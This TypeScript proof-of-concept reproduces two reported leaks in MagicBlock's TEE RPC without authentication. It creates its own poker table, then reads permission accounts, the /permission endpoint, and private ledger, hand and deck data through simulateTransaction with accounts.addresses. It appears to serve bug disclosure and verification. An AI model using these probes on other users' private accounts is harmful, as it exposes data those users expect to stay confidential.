// Reproduces two reported leaks in MagicBlock's TEE RPC, using no login at all:
//  B1: permission accounts / the /permission endpoint list who may read a private account.
//  B2: simulateTransaction with `accounts.addresses` returns private account data.
// Creates a table, seats p2, probes, then cleans up. Writes results/tee-leaks-<ts>.json.
import { PublicKey, SystemProgram, Transaction, Keypair } from "@solana/web3.js";
import { permissionPdaFromAccount } from "@magicblock-labs/ephemeral-rollups-sdk";
import fs from "fs";
import path from "path";
import { CONFIG_PDA, loadKey, programFor, programOn, teeConnection, TEE_URL, randomTableId } from "./lib";
import { BN, sleep, tableApi, handOf, tokenOf } from "../tests/helpers";

async function rpc(method: string, params: any[]) {
  const r = await fetch(TEE_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  return r.json() as Promise<any>;
}

async function main() {
  const deployer = loadKey("deployer"), p2 = loadKey("p2");
  const out: any = { ranAt: new Date().toISOString(), note: "every probe below is made WITHOUT a TEE login token" };
  const T = tableApi(deployer, randomTableId());
  const erD = programOn(await teeConnection(deployer), deployer), erP2 = programOn(await teeConnection(p2), p2);
  await T.create({ smallBlind: BN(100_000), bigBlind: BN(200_000), minBuyIn: BN(2_000_000), maxBuyIn: BN(20_000_000), maxSeats: 6, inviteOnly: false });
  await T.delegate(); await sleep(4000);
  await T.open(erD, deployer.publicKey);
  await T.buyIn(erP2, p2.publicKey, 1, 2_000_000n);
  await sleep(2000);
  out.table = T.table.toBase58(); out.ledger = T.ledger.toBase58(); out.p2 = p2.publicKey.toBase58();

  // control: plain getAccountInfo without a token
  const ctl = await rpc("getAccountInfo", [T.ledger.toBase58(), { encoding: "base64" }]);
  out.control_getAccountInfo_ledger = ctl.result?.value === null ? "null (hidden, as expected)" : "VISIBLE";

  // B1: permission accounts and the /permission endpoint
  const permAcct = await rpc("getAccountInfo", [permissionPdaFromAccount(T.ledger).toBase58(), { encoding: "base64" }]);
  const permData = permAcct.result?.value ? Buffer.from(permAcct.result.value.data[0], "base64") : null;
  out.B1_ledgerPermissionAccount = permData ? { bytes: permData.length, containsP2Wallet: permData.includes(p2.publicKey.toBuffer()) } : "null";
  const handPerm = await rpc("getAccountInfo", [permissionPdaFromAccount(handOf(T.table, 1)).toBase58(), { encoding: "base64" }]);
  const handPermData = handPerm.result?.value ? Buffer.from(handPerm.result.value.data[0], "base64") : null;
  out.B1_seat1HandPermissionAccount = handPermData ? { bytes: handPermData.length, containsP2Wallet: handPermData.includes(p2.publicKey.toBuffer()) } : "null";
  try {
    const r = await fetch(`${TEE_URL}/permission?pubkey=${T.ledger.toBase58()}`);
    const txt = await r.text();
    out.B1_permissionEndpoint = { http: r.status, containsP2Wallet: txt.includes(p2.publicKey.toBase58()), body: txt.slice(0, 400) };
  } catch (e) { out.B1_permissionEndpoint = String(e); }

  // B2: simulateTransaction returning private accounts
  const stranger = Keypair.generate();
  const tx = new Transaction().add(SystemProgram.transfer({ fromPubkey: stranger.publicKey, toPubkey: stranger.publicKey, lamports: 0 }));
  tx.feePayer = stranger.publicKey;
  tx.recentBlockhash = (await rpc("getLatestBlockhash", [])).result.value.blockhash;
  const b64 = tx.serialize({ requireAllSignatures: false, verifySignatures: false }).toString("base64");
  const sim = await rpc("simulateTransaction", [b64, { encoding: "base64", sigVerify: false, replaceRecentBlockhash: true, accounts: { encoding: "base64", addresses: [T.ledger.toBase58(), handOf(T.table, 1).toBase58()] } }]);
  const simDeck = await rpc("simulateTransaction", [b64, { encoding: "base64", sigVerify: false, replaceRecentBlockhash: true, accounts: { encoding: "base64", addresses: [T.deck.toBase58()] } }]);
  const accts = sim.result?.value?.accounts ?? [];
  const ledgerData = accts[0] ? Buffer.from(accts[0].data[0], "base64") : null;
  let decoded: any = null;
  if (ledgerData) {
    const l = (programFor(deployer).coder.accounts as any).decode("ledger", ledgerData);
    decoded = { seat1Player: l.seats[1].player.toBase58(), seat1Stack: l.seats[1].stack.toString(), escrowOwed: l.escrowOwed.toString() };
  }
  out.B2_simulateTransaction = {
    error: sim.error ?? null,
    ledgerReturned: !!ledgerData, ledgerBytes: ledgerData?.length, ledgerDecoded: decoded,
    handReturned: !!accts[1], deckReturned: !!(simDeck.result?.value?.accounts ?? [])[0],
  };

  // clean up
  await T.cashOut(erP2, p2.publicKey, 1);
  await T.collectRake(erD, tokenOf(deployer.publicKey));
  await T.close(erD, deployer.publicKey);
  out.cleanedUp = true;

  const file = path.join(__dirname, "../results", `tee-leaks-${Date.now()}.json`);
  fs.writeFileSync(file, JSON.stringify(out, null, 2));
  console.log(JSON.stringify(out, null, 2));
}
main().catch((e) => { console.error(e); process.exit(1); });
